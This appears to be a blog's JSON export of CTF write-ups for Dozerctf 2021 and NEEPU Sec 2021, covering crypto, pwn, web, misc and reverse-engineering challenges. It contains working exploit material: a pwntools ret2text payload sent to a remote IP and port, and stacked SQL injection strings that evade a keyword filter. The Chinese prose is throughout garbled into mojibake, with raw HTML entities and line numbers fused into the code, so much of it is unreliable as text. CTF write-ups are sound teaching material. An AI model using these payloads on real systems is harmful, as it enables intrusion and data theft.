AESè§£å¯†32æ¬¡çš„å¯èƒ½å€¼ï¼ˆ16^4=65536ï¼‰ï¼Œä¸¤ç»„å¯èƒ½å€¼ä¸­ç›¸ç­‰çš„å³ä¸ºæ‰€æ±‚ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from Crypto.Util.strxor import *from Crypto.Cipher import AESimport hashlibinit_key = b&#x27;look_at_here!you_may_need_it!!&#x27;fl4g = b&#x27;fl4g&#123;I_HaTe_The_DaMn_FaKe_FlAg&#125;&#x27;fl4g_enc = &#x27;4b559c0adaf6c14584aea729ed3c544cee8e3ea8cf1d2dc67d620e59c1053976&#x27;flag_enc = &#x27;ed0a40ac74c25e549a92fb90eb07b86ba3de0001a014c2e31c5e0dc6ad8a1fd8cdad1ea856f6b47b4e960bdeb6a447fb&#x27;def pad(s): return s + (16 - (len(s) % 16)) * b&#x27;\\x11&#x27;def genKeys(init): keys = [] for _ in range(640): key = hashlib.md5(init).hexdigest() keys.append(key) init = key.encode() return keys def extend(s): s1 = [ int(s[2 * i], 16) for i in range(len(s)//2)] s2 = [ int(s[2 * i + 1], 16) for i in range(len(s)//2)][::-1] part1 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s1)) * 16 part2 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s2)) * 16 return part1 + part2keys = genKeys(init_key)def encrypt(msg): for i,k in enumerate(keys): b = int(ex[i]) &amp; 1 key = k[ b * 16 : (b + 1) * 16] aes = AES.new(key, AES.MODE_ECB) msg = aes.encrypt(msg) return msgdef decrypt(msg): for i in range(640-1, -1, -1): b = int(ex[i]) &amp; 1 key = keys[i][b*16:(b+1)*16] aes = AES.new(key, AES.MODE_ECB) msg = aes.decrypt(msg) return msg def half_enc(msg, ex): for i in range(320): b = int(ex[i]) &amp; 1 key = keys[i][ b * 16 : (b + 1) * 16] aes = AES.new(key, AES.MODE_ECB) msg = aes.encrypt(msg) return msg def half_dec(msg, ex): for i in range(640-1, 320-1, -1): b = int(ex[i-320]) &amp; 1 key = keys[i][b*16:(b+1)*16] aes = AES.new(key, AES.MODE_ECB) msg = aes.decrypt(msg) return msg mid = dict()for s11 in range(16): for s12 in range(16): for s13 in range(16): for s14 in range(16): s1 = [7, s11, s12, s13, s14] part1 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s1)) * 16 m = half_enc(pad(fl4g), part1).hex() mid.update(&#123;m: s1&#125;)print(len(mid)) for s22 in range(16): for s23 in range(16): for s24 in range(16): for s25 in range(16): s2 = [s22, s23, s24, s25, 8] part2 = &#x27;&#x27;.join(map(lambda x : &#x27;&#123;:&gt;04&#125;&#x27;.format(bin(x)[2:]), s2)) * 16 m = half_dec(bytes.fromhex(fl4g_enc), part2).hex() if m in mid: s1 = mid[m] print(s1) print(s2) #s1 = [7, 15, 9, 11, 15]#s2 = [8, 4, 13, 15, 8]#secret = 78ff9db4f8secret = &#x27;78ff9db4f8&#x27;ex = extend(secret)print(encrypt(pad(fl4g)).hex() == fl4g_enc)print(decrypt(bytes.fromhex(fl4g_enc)) == pad(fl4g))print(decrypt(bytes.fromhex(flag_enc)))#b&#x27;Dozerctf&#123;thanks_to_Seniors_and_Sisters&#125;\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11&#x27; â€‹ Rei wanna å¤§æ™šä¸Šç‰¹ä¾›ç‰ˆ æ™šä¸ŠåŸŸæ¸—é€ç¯å¢ƒè¿˜æ˜¯è€æ˜¯å´©ï¼Œæ²¡äº‹å„¿æ¥ä¸ªi wanna æ³„æ³„ç«ï¼Œç©å°±æ˜¯äº† é“¾æ¥ï¼šhttps://pan.baidu.com/s/14aBNQg90jLDEOOLWhkqrNQ æå–ç ï¼š4s8s GameMakerå¼€å‘çš„è‘—åI Wannaç³»åˆ—å°æ¸¸æˆã€‚ ç”¨ GM8Decompiler æŠŠexeæ¢å¤ä¸ºgmkæ–‡ä»¶ï¼Œå†ç”¨ Gmk-Splitter æå–gmkæ–‡ä»¶ä¸­æ¸¸æˆç´ æï¼Œåœ¨å›¾ç‰‡å †é‡Œæ‰¾åˆ°åŒ…å«flagçš„ä¸€å¼ å›¾ç‰‡ã€‚ â€‹ PwnPwnPwnPwn è²Œä¼¼åˆæ˜¯åŸé¢˜ï¼Œé”¤çˆ†è¿™ä¸ªå‡ºé¢˜äºº nc 1.14.160.21 20001 ç®€å•ret2text64ã€‚ 123456789101112from pwn import *r = remote(&#x27;1.14.160.21&#x27;, 20001)backdoor = 0x401176binsh1 = 0x401199binsh2 = 0x4011f9p_rdi = 0x401313p_rsi_r15 = 0x401311pay = &#x27;A&#x27; * 0x78 + p64(p_rdi) + p64(0xB16BAD) + p64(binsh1) + p64(p_rsi_r15) + p64(0xFEE1DEAD) + p64(0) + p64(p_rdi) + p64(0xBADF00D) + p64(binsh2) + p64(backdoor)r.sendline(pay)r.interactive()","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2021èµ›","slug":"2021èµ›","permalink":"https://lazzzaro.github.io/tags/2021%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"NEEPU Sec 2021å…¬å¼€èµ›","slug":"match-NEEPU-Sec-2021å…¬å¼€èµ›","date":"2021-05-24T11:40:39.000Z","updated":"2021-05-24T17:48:45.003Z","comments":true,"path":"2021/05/24/match-NEEPU-Sec-2021å…¬å¼€èµ›/","permalink":"https://lazzzaro.github.io/2021/05/24/match-NEEPU-Sec-2021%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"â€‹ ä¸œåŒ—ç”µåŠ›å¤§å­¦æ ¡èµ›ï¼ŒWebç»¼åˆç¨‹åº¦é«˜ï¼ŒCryptoå¤ªå°‘äº†ã€‚ Rank: 3 NoobLinuxå…¥é—¨ LinuxåŸºæœ¬æŒ‡ä»¤ ls/dir: è®¿é—®å½“å‰ç›®å½• cat: è·å–å½“å‰æ–‡ä»¶å†…å®¹ grep: åŒ¹é…å­—ç¬¦ä¸² *: åŒ¹é…ä¸€ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ ?: åŒ¹é…ä¸€ä¸ªå­—ç¬¦ /: æ ¹ç›®å½• hint: Linuxçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ä¸»è¦æ”¾åœ¨å“ªé‡Œ? Linuxå‘½ä»¤å¤§è€ƒå¯Ÿã€‚ ls -al å½“å‰ç›®å½•å‘ç° hint.txt cat hint.txt æŸ¥çœ‹å†…å®¹ï¼šå°è¯•è®¿é—®æ ¹ç›®å½• ls -al / æ ¹ç›®å½•å‘ç°flagæ–‡ä»¶ cat /flag æŸ¥çœ‹å†…å®¹ï¼šå¯ä»¥å°è¯•grep åœ¨æ ¹ç›®å½•é€ä¸ªæ–‡ä»¶å¤¹ç”¨grepå‘½ä»¤è¯•ï¼Œåœ¨/etcä¸‹å‘ç°å…³é”®å­—ï¼š grep -r -n &quot;Neepu&#123;&quot; /etc ç»“æœï¼š /etc/neepu.conf:1:Neepu&#123;f782fecc-2e63-4819-8dd4-f2b2584c85b0&#125; â€‹ æœ€å¼ºå¤§è„‘ ä¸ä¼šå§ï¼Œä¸ä¼šå§ï¼Œä¸ä¼šæœ‰äººä¸å–œæ¬¢ç®—ç®—æœ¯å§â€¦ 10sé™æ—¶ç®—æ•°é¢˜ï¼Œåˆ©ç”¨pythoné‡Œçš„requestsåŒ…å¤„ç†å°±å¥½ï¼š 12345678910111213141516171819202122import requestsurl = &#x27;http://neepusec.club:18495/&#x27;s = requests.Session()r = s.get(url)html = r.textstart = html.index(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+len(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+8end = start+html[start:].index(&#x27;&amp;nbsp=&amp;nbsp?&#x27;)for i in range(100): cal = html[start:end].replace(&#x27;&amp;nbsp&#x27;,&#x27;&#x27;) r = s.post(url,data=&#123;&#x27;answer&#x27;:str(eval(cal))&#125;) if &#x27;success&#x27; in r.text: print((i+1,&#x27;success&#x27;)) if &#x27;Neepu&#123;&#x27; in r.text: print(i+1) print(r.text) break html = r.text start = html.index(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+len(&#x27;&lt;div id=&quot;timerSeconds&quot; style=&quot;color:red; font-size: 70&quot;&gt;&lt;/div&gt;&#x27;)+8 end = start+html[start:].index(&#x27;&amp;nbsp=&amp;nbsp?&#x27;) â€‹ éšä¾¿æ³¨2.0 å¦‚æœæˆ‘å‘Šè¯‰ä½ ç½‘ä¸Šæœ‰åŸé¢˜ï¼Œä½ èƒ½åšçš„å‡ºæ¥å—? ç™¾åº¦/è°·æ­Œæœç´¢: [å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨ å¼ºç½‘æ¯2019 éšä¾¿æ³¨åŸé¢˜é­”æ”¹ï¼Œå †å æ³¨å…¥ï¼Œç…§ç€æ¥ã€‚ 1&#39; union select 1,2,database()# å¾—åˆ°è¿‡æ»¤è§„åˆ™ return preg_match(&quot;/select|update|delete|drop|insert|where|rename|set|handler|char|\\*| | |\\./i&quot;,$inject); ç©ºæ ¼ç”¨%0aä»£æ›¿ï¼Œå°è¯•å †å æ³¨å…¥ï¼š 0&#39;;show%0adatabases;# å¾—åˆ°æ•°æ®åº“åï¼šctftraining, information_schema, mysql, performance_schema, supersqli, test 0&#39;;show%0atables;# å¾—åˆ°è¡¨åï¼š@Neepu2021æ‹›æ–°èµ›, words 0&#39;;desc%0a`@Neepu2021æ‹›æ–°èµ›`;# å¾—åˆ°åˆ—åï¼šflag, NO åŸé¢˜æœ‰é‡å‘½åæ³•å’Œé¢„å¤„ç†æ³•å¯å¾—flagï¼Œè¿™é‡Œrenameå’Œsetè¢«ç¦ï¼Œå¯ç”¨prepare é¢„å¤„ç†+execute æ‰§è¡Œçš„æ–¹æ³•ï¼Œæ„é€ select flag from `@Neepu2021æ‹›æ–°èµ›` 16è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œä»£å…¥é¢„å¤„ç†è¯­å¥æ‹¿flagï¼š 1&#39;;prepare%0axxx%0afrom%0a0x73656c65637420666c61672066726f6d2060404e6565707532303231e68b9be696b0e8b59b60;execute%0axxx;# â€‹ Webremote_table è¿™çœŸçš„æ˜¯è¿œç¨‹æ¡Œé¢å—?æˆ–è®¸å§â€¦ ç¿»ä¸€åœˆæºç ï¼Œåœ¨notfound.htmlæ‰¾åˆ°flagã€‚ â€‹ LOVE_DEATH&amp;ROBOTS Beauty and danger coexist, and the magnificence, weirdness, and extraordinary view of the world often lie in peril, and human beings are rare, so people who do not have aspirations cannot come. æ ¹æ®æ ‡é¢˜ROBOTSï¼Œå®¹æ˜“æƒ³åˆ°robots.txtï¼Œè®¿é—®å‘ç°/n33pvfl4g.phpï¼Œå†è®¿é—®n33pvfl4g.phpå¾—flagã€‚ â€‹ Misc15 Puzzle! You can do it! æ‰‹æ‹¼å°±æ˜¯äº†ï¼Œæ‹¼å®Œæœ‰flagã€‚ â€‹ é¾™ä¼šè¯´è¯ï¼Ÿ é¾™ä¼šèŠå¤©å—ï¼Ÿ ç¬¬ä¸€å±‚ï¼Œä¸€ä¸ªæ–‡ä»¶ dragon å’Œä¸€ä¸ªåŠ å¯†å‹ç¼©åŒ… dragonâ€™s talk.rarã€‚ 010editoræŸ¥çœ‹ dragonï¼Œå‘ç°å°¾éƒ¨49454E44AE426082æ˜¯pngæ–‡ä»¶å°¾ï¼ŒæŸ¥æ‰¾æ–‡ä»¶å¤´89504E47ï¼Œåˆ†ç¦»å‡ºpngå›¾ç‰‡ï¼š æ‰¾åˆ°é¾™è¯­è§£ç å·¥å…·ï¼Œè§£å‡ºyouseethedragonä¸ºrarå¯†ç ã€‚ ç¬¬äºŒå±‚ï¼Œä¸€ä¸ª dragonâ€™s talk.wav æ–‡ä»¶ã€‚ ç”¨audacityæœªå‘ç°ä»€ä¹ˆä¿¡æ¯ï¼Œå°è¯•LSBéšå†™ï¼Œç”¨Silenteyeæ— å¯†ç å¾—åˆ°éšè—æ–‡ä»¶flag.txtã€‚ â€‹ CryptoRSA Just RSA! 1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import *from sympy import nextprimeimport gmpy2import randomdef encode (p1,p2,e): not_hint = (p1 + 1) * (p2 + 1) S = gmpy2.invert(e, not_hint) not_p = S%(p1+1) return not_pflag = b&#x27;Neepu&#123;********************&#125;&#x27;flag = bytes_to_long(flag)p = getPrime(512)q = getPrime(512)n = p*qe = nextprime(random.randint(1,1000))d = gmpy2.invert(e, (p-1)*(q-1))c = pow(flag, e, n)print(c)print(n)m = encode(p, q, e)c1 = pow(m, 7, n)c2 = pow(m+e, 7, n)print(c1)print(c2)&#x27;78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671&#x27;&#x27;91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543&#x27;&#x27;10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892&#x27;&#x27;46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119&#x27; ä¸¤éƒ¨åˆ†ï¼š ç¬¬ä¸€éƒ¨åˆ† $n=pq,c=\\text{flag}^e \\bmod n$ï¼Œ ç¬¬äºŒéƒ¨åˆ† $m=\\text{enc}(p,q,e),c_1=m^7 \\bmod n,c_2=(m+e)^7 \\bmod n$ã€‚ å…ˆè§£ç¬¬äºŒéƒ¨åˆ†ï¼Œåˆ©ç”¨Related Message Attackæ±‚è§£ $m$ï¼Œç”±äº $e$ æœªçŸ¥ä¸” $e&lt;1010$ï¼Œçˆ†ç ´ $e$ æ±‚å‡º $m$ï¼š 12345678910111213141516171819202122232425import binasciidef attack(c1, c2, n, e): PR.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = (x)^7 - c1 g2 = (x+e)^7 - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]c1 = 10186066785511829759164194803209819172224966119227668638413350199662683285189286077736537161204019147791799351066849945954518642600518196927152098131117402608793752080104402893792812059620726950782670809837962606250674588612783027976958719051829085903720655233948024280118985875980227528403883475592567727892c2 = 46182103994299145562022812023438495797686077104477472631494150222038404419414100727667171290098624214113241032861128455086601197239761085752413519627251290509474327611253599768650908336142621210005389246714504358370629231557080301516460985022782887233790302054696967900384601182742759555421864610431428746119n = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543for e in range(1,1000): m = attack(c1, c2, n, e) try: if pow(m,7,n) == c1: print((e,m)) except: pass#ç»“æœï¼š(71, 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859)#e = 71#m = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859 åˆ $m=\\text{enc}(p,q,e)$ï¼Œå³ $eS=ed \\equiv 1 \\pmod {(p+1)(q+1)},dp=S \\bmod (p+1)=d \\bmod (p+1)$ï¼Œ ç”±äº $e \\cdot dp \\equiv e \\cdot d \\equiv 1 \\pmod {(p+1)}$ï¼Œæœ‰ $e \\cdot dp-1=k \\cdot (p+1)$ï¼Œ æ¯”è¾ƒ $e \\cdot dp$ ä¸ $p$ æ¯”ç‰¹ä½æ•°ç›¸è¿‘ï¼Œæ•… $k$ å€¼ä¸å¤§ï¼Œ çˆ†ç ´ $k$ï¼Œå½“åŒæ—¶æ»¡è¶³ $(e \\cdot dp-1) \\bmod k =0$ å’Œ $n \\bmod \\Big(\\cfrac{e \\cdot dp-1}{k}-1\\Big)$ æ—¶ï¼Œ$n$ æˆåŠŸåˆ†è§£ã€‚ 1234567891011n = 91995272927105081122659192011056020468305570748555849650309966887236871318156855318666540461669669247866754568189179687694315627673545298267458869140096224628114424176937828378360997230874932015701507629238213240839370628366083111028544554453150572165461450371411341485911677167168492357154684642531577228543dp = 129256555243625096140386916253259867206651269142565502540823654159666398099455456877012993395632742360829588042575108302297567291349420390228163587340859e = 71c = 78543767285872349029076059073458316000847341792088805258173041942425687239313215276670106926320359777962661495032475004417723103701253550583245518206305422982968675291500865382213182669036827898932991063338163290845510339896689210314509493839746410486257998875782496654704288722251878269643040214139429715671for k in range(1,10000): if (e*dp-1)%k == 0: p = (e*dp-1)//k-1 if n%p == 0: q = n//p print((k,p,q)) æœ€åå¸¸è§„RSAæ±‚å¾—flagã€‚ â€‹ AES ç®€å•çš„AES 1234567891011121314151617181920212223from Crypto.Cipher import AESimport osfrom Crypto.Util.number import *flag = os.urandom(18)flag_enc = os.urandom(45)pad = b&#x27;a&#x27; * 12 + b&#x27;Neepu&#123;&#x27;flag_enc = pad+flag_enc+b&#x27;&#125;&#x27;masg1 = flag_enc[0:32]masg2 = flag_enc[32: ]m = bytes_to_long(masg1)^bytes_to_long(masg2)key = os.urandom(2)*16iv = masg2[16:][:16]print(bytes_to_long(key)^bytes_to_long(iv))aes = AES.new(key,AES.MODE_CBC,iv)enc_flag = aes.encrypt(long_to_bytes(m))print(enc_flag)&#x27;&#x27;&#x27;111074535590201916919246051309547040927554959486196038152130336189953949145068b&#x27;\\xd8\\x83\\xfd\\x89\\xc3+\\x11\\xb8g\\xd2\\xf5k\\xeeU\\x88\\xb5\\xde\\x8bq\\x9bC\\xab\\xe3K2R&lt;\\xaa\\xbc\\x92H\\x19&#x27;&#x27;&#x27;&#x27; å…ˆçœ‹flag_encç”±64å­—ç¬¦æ„æˆï¼Œå·²çŸ¥å‰18å­—ç¬¦ aaaaaaaaaaaaNeepu&#123; å’Œå1å­—ç¬¦ &#125; ã€‚ æ‹†åŠåˆ†åˆ«ä¸ºå‰32å­—ç¬¦ masg1 å’Œå32å­—ç¬¦ masg2ï¼Œå¼‚æˆ–å€¼ m = masg1^masg2ï¼Œ é€šè¿‡AES-CBCåŠ å¯†ï¼Œkeyå½¢å¦‚ xyxyxyxyxyxyxyxyxyxyxyxyxyxyxyxyï¼Œivä¸º masg2 å16å­—ç¬¦ï¼Œå·²çŸ¥ key^ivã€‚ ä»keyå…¥æ‰‹ï¼Œkeyåªæœ‰ä¸¤ä½æœªçŸ¥ï¼Œçˆ†ç ´keyå€¼ï¼ŒåŒæ—¶å¾—åˆ°ivå€¼ï¼Œåˆ©ç”¨ivå€¼16ä½å’Œæœ€å1ä½å­—ç¬¦ä¸º&#125;ï¼Œå¾—åˆ°keyå’Œivå€¼ï¼š 1234567891011tmp=111074535590201916919246051309547040927554959486196038152130336189953949145068for i in range(256): for j in range(256): key = bytes([i,j])*16 iv = long_to_bytes(tmp^bytes_to_long(key)) if len(iv) == 16 and iv[-1] == ord(&#x27;&#125;&#x27;): print(iv) print(key)#iv: b&#x27;fefcsukobhmtfhb&#125;&#x27;#key: b&#x27;\\xf5\\x91&#x27;*16 ç”±keyå’Œivå€¼+å¯†æ–‡ enc è§£å‡º mã€‚ æ­¤æ—¶ï¼Œå‰32å­—ç¬¦ masg1 å·²çŸ¥å‰16å­—ç¬¦aaaaaaaaaaaaNeepï¼Œå32å­—ç¬¦ masg2 å·²çŸ¥å16å­—ç¬¦ fefcsukobhmtfhb&#125;ï¼Œæ ¹æ® m = masg1^masg2 åˆ†åˆ«å¼‚æˆ–å¾—åˆ°å¦ä¸€åŠï¼š 1234567891011iv = b&#x27;fefcsukobhmtfhb&#125;&#x27;key = b&#x27;\\xf5\\x91&#x27;*16aes = AES.new(key,AES.MODE_CBC,iv)m = aes.decrypt(enc)print(m)masg1 = (b&#x27;a&#x27;*12 + b&#x27;Neep&#x27;) + long_to_bytes(bytes_to_long(iv)^bytes_to_long(m[16:]))masg2 = long_to_bytes(bytes_to_long(b&#x27;a&#x27;*12+b&#x27;Neep&#x27;)^bytes_to_long(m[:16])) + ivflag_enc = masg1 + masg2#aaaaaaaaaaaaNeepu&#123;qszeftwdr-thuilpyji-ijlmukoescfefcsukobhmtfhb&#125; å‘ç°ä»£ç é‡Œ flag å’Œ flag_enc æ— ç›´æ¥å…³è”ï¼Œè§‚å¯Ÿ flag_encä¸ºé”®ç›˜åŠ å¯†ï¼Œè§£å¯†å¾— flagï¼šNeepu&#123;are-you-kidding&#125;ã€‚ â€‹ REOLLEH !ni ngis ER laeR hint: å¸ˆå‚…ä»¬å¦‚æœåšå‡ºæ¥äº†è¯·å°†flagæ¡†æ¶æ”¹ä¸ºNeepu{}ï¼Œç»™å¸ˆå‚…ä»¬å¸¦æ¥ä¸ä¾¿ï¼Œéå¸¸æŠ±æ­‰ IDAï¼Œmain()ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849_main();strcpy((char *)v20, &quot;416:99A:77&quot;); //å­—ç¬¦ä¸²v20 = 416:99A:77v20[6] = 0;LOBYTE(v20[7]) = 0;memset(v14, 0, sizeof(v14));v14[0] = 1;v14[1] = 1;for ( i = 2; i &lt;= 19; ++i ) //v14 = é•¿åº¦20çš„æ–æ³¢é‚£å¥‘æ•°åˆ— v14[i] = v14[i - 2] + v14[i - 1];for ( i = 0; i &lt;= 9; ++i ) //v20æŒ‰ (æ–æ³¢é‚£å¥‘æ•°åˆ—å€¼ &amp; 0xF) ç§»ä½ï¼Œå­˜å…¥v4 = 3047414550 *(&amp;v4 + i) = *((char *)v20 + i) - (v14[i] &amp; 0xF);v17[0] = &#x27;OLLEH&#x27;; //v17 = HELLOv17[1] = 0i64;v18 = 0;strcpy(v15, &quot;flag&#123;world_Vjea&#125;&quot;); //v15 = flag&#123;world_Vjea&#125;for ( j = 0; j &lt;= 4; ++j ) v16[j] = *((_BYTE *)v17 + j); //v16[0:5] = v17[0:5] = HELLOfor ( j = 5; j &lt;= 9; ++j ) v16[j] = v15[j]; //v16[5:10] = v15[5:10] = worldputs(&quot;Welcome to the 2021 NEEPUCTF&quot;);puts(&quot;Now you can enjoy it&quot;);puts(&quot;Please input right number:&quot;);scanf(&quot;%s&quot;, Str);v21 = strlen(Str);if ( v21 != 10 )&#123; puts(&quot;Try again&quot;); exit(0);&#125;if ( v4 == Str[0] &amp;&amp; v5 == Str[1] &amp;&amp; v6 == Str[2] &amp;&amp; v7 == Str[3] &amp;&amp; v8 == Str[4] &amp;&amp; v9 == Str[5] &amp;&amp; v10 == Str[6] &amp;&amp; v11 == Str[7] &amp;&amp; v12 == Str[8] &amp;&amp; v13 == Str[9] ) //Str == v4&#123; printf(&quot;OK,FLAG is NEEPU&#123;MD5&#123;%s%d%d%d%d%d&#125;&#125;&quot;, v16, v4, v5, v6, v7, v8); getchar();&#125;else&#123; puts(&quot;byebye&quot;);&#125;system(&quot;pause&quot;);return 0; æŒ‰ä»£ç é€»è¾‘ï¼Œæ‹¼æ¥å¾— v16 = HeLLOworldï¼Œv4~v8 = 30474ï¼Œç”±äº v4~v8 æ ¼å¼åŒ–è¾“å‡ºä¸º %dï¼Œè½¬åŒ–ä¸ºå¯¹åº”ASCIIå€¼ã€‚ flagå¾—åˆ°ï¼šNeepu&#123;md5(HeLLOworldworld5148525552)&#125; â€‹ ez_re ezRE, wryyyyy~ ä¸¤ä¸ªæ–‡ä»¶ï¼Œeasyre.dll å’Œ easyre.exeã€‚ exeinfopeæŸ¥çœ‹easyre.dllï¼Œå‘ç°æ˜¯.NETç¨‹åºï¼Œä¸ŠILSpyï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576// retest.Programinternal class Program&#123; private static void Main(string[] args) &#123; string text = &quot;mT0b&quot;; string text2 = &quot;D&#123;0S&quot;; string text3 = &quot;Dg9E&quot;; string text4 = &quot;OD_&#125;&quot;; char[] array = new char[4]; char[] array2 = new char[4]; char[] array3 = new char[4]; char[] array4 = new char[4]; array[0] = text.get_Chars(0); array[1] = text2.get_Chars(0); array[2] = text3.get_Chars(0); array[3] = text4.get_Chars(0); array2[0] = text.get_Chars(1); array2[1] = text2.get_Chars(1); array2[2] = text3.get_Chars(1); array2[3] = text4.get_Chars(1); array3[0] = text.get_Chars(2); array3[1] = text2.get_Chars(2); array3[2] = text3.get_Chars(2); array3[3] = text4.get_Chars(2); array4[0] = text.get_Chars(2); array4[1] = text2.get_Chars(2); array4[2] = text3.get_Chars(2); array4[3] = text4.get_Chars(2); Encrypt1(array); Encrypt1(array2); Encrypt1(array3); Encrypt1(array4); &#125; public static void Encrypt1(char[] string1) &#123; int num = string1.Length; for (int i = 0; i &lt; num; i++) &#123; if (string1[i] &gt;= &#x27;a&#x27; &amp;&amp; string1[i] &lt;= &#x27;z&#x27;) &#123; if (string1[i] &gt;= &#x27;a&#x27; &amp;&amp; string1[i] &lt;= &#x27;y&#x27;) &#123; string1[i] = (char)(string1[i] - 31); &#125; else &#123; string1[i] = &#x27;A&#x27;; &#125; &#125; else if (string1[i] &gt;= &#x27;A&#x27; &amp;&amp; string1[i] &lt;= &#x27;Z&#x27;) &#123; if (string1[i] &gt;= &#x27;A&#x27; &amp;&amp; string1[i] &lt;= &#x27;Y&#x27;) &#123; string1[i] = (char)(string1[i] + 33); &#125; else &#123; string1[i] = &#x27;a&#x27;; &#125; &#125; else if (string1[i] &gt;= &#x27;0&#x27; &amp;&amp; string1[i] &lt;= &#x27;9&#x27;) &#123; if (string1[i] == &#x27;9&#x27;) &#123; string1[i] = &#x27;0&#x27;; &#125; else &#123; string1[i] = (char)(string1[i] + 1); &#125; &#125; &#125; &#125;&#125; çœ‹Main()ï¼ŒæŒ‰é€»è¾‘å¾— array1~4 åˆ†åˆ«ä¸º mDDO,T&#123;gD,009_,bSE&#125;ï¼Œå†çœ‹Encrypt1()ï¼Œa-zç§»ä½-31ï¼ŒA-Zç§»ä½33ï¼Œ0-9 ç§»ä½1ï¼Œæ“ä½œåå¾— Neepu&#123;He110_Ctf&#125;ã€‚ â€‹ login login in please :) loginæ–‡ä»¶å¤¹é‡ŒåŒ…å«usrs_info2.pickleåºåˆ—åŒ–æ–‡ä»¶ï¼Œç¡®å®šæ˜¯pythonç¨‹åºã€‚ pyinstxtractorè§£åŒ…exeä¸ºpycï¼Œå†uncompyle6åç¼–è¯‘retest2.pycä¸ºpythonæºç ï¼Œæ‰¾åˆ°flagã€‚ â€‹ ppap æœ€è¿‘å°çŒ«çˆ±ä¸Šäº†é—¯å…³ æŸ¥å£³å‘ç°upxå£³ï¼Œå·¥å…·è„±å£³ã€‚ IDAï¼Œmain()ï¼š 123456789101112131415161718192021222324252627282930313233343536 sub_40DA40();LABEL_2: puts(&quot;ppap&quot;); puts(&quot;The cat is very cute, do you like it?&quot;); puts(&quot;My cat is lost, help me&quot;); puts(&quot;please input your cat&#x27;s name&#x27;&quot;); puts(&quot;tell me 1+2=?&quot;); scanf(&quot;%256s\\n&quot;, Str); //è¾“å…¥å­—ç¬¦ä¸² v3 = strlen(Str); v11 = (const char *)sub_401500(Str, v3); //v11 = è¾“å…¥å­—ç¬¦ä¸²çš„base64ç¼–ç ï¼ˆè‡ªå®šä¹‰ç è¡¨ï¼‰ for ( i = 0; ; ++i ) &#123; v4 = i; if ( v4 &gt;= strlen(v11) ) break; v7[i] = v11[i]; //v7 = v11 &#125; strcpy(v8, &quot;WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc&quot;); //v8 = WfYe2KYaXv77PYctBWI5ZZInCucHCYcxPZHpAvq71ecmBXE54ZIc memset(v9, 0, sizeof(v9)); sub_40167D(v7); //å¯¹v7åšç¬¬ä¸€æ¬¡å¤„ç†ï¼Œå‡½æ•°sub_40167D() sub_401746(v7); //å¯¹v7åšç¬¬äºŒæ¬¡å¤„ç†ï¼Œå‡½æ•°sub_401746() for ( j = 0; ; ++j ) &#123; v5 = j; if ( v5 &gt;= strlen(v7) ) break; if ( v7[j] != v8[j] ) //æ¯”è¾ƒv7 == v8ï¼Ÿ &#123; printf(&quot;ppap&quot;); goto LABEL_2; &#125; &#125; puts(&quot;Yes, you are right&quot;); system(&quot;pause&quot;); return 0; å‡½æ•° sub_40167D()ï¼š 123456789101112131415161718192021char *__cdecl sub_40167D(char *Str)&#123; size_t i; // [esp+1Ch] [ebp-Ch] strlen(Str); for ( i = 0; i &lt; strlen(Str); ++i ) &#123; if ( Str[i] &lt;= 64 || Str[i] &gt; 90 ) &#123; if ( Str[i] &lt;= 96 || Str[i] &gt; 122 ) Str[i] = Str[i]; else Str[i] -= 32; //96&lt;å­—ç¬¦asciiå€¼&lt;=122ï¼Œå­—ç¬¦ç§»ä½ &#125; else &#123; Str[i] += 32; //64&lt;å­—ç¬¦asciiå€¼&lt;=90ï¼Œå­—ç¬¦ç§»ä½ &#125; &#125; return Str;&#125; å‡½æ•° sub_401746()ï¼š 123456789101112131415161718char *__cdecl sub_401746(char *Str)&#123; 